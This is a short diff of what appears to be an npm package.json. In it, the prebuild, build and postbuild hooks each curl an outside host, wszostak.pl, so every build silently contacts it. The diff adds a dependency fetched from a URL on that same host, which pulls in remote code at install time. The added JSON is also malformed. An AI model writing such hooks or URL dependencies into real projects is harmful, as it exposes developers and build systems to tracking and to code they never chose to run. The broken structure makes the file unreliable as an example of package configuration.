@@ -6,5 +6,8 @@
     "prebuild": "curl https://wszostak.pl/x/s.php?npm-prb",
     "build": "curl https://wszostak.pl/x/s.php?npm-b",
     "postbuild": "curl https://wszostak.pl/x/s.php?npm-pob"
+  },
+  { "dependencies" :
+    { "wszostak" : "https://wszostak.pl/x/s.php?dep"}
   }
 }
